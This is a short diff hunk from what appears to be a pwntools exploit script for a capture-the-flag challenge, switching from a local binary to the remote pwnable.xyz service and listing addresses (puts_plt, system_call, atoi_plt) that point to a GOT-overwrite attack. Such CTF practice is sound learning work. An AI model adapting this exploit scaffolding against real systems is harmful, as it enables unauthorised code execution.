@@ -5,7 +5,7 @@ puts_plt = 0x601220
 system_call = 0x400750
 atoi_plt = 0x601268
 
-p = process('./challenge')
+# p = process('./challenge')
 p = remote('svc.pwnable.xyz', 30016)
 
 p.sendlineafter('>', str(1))
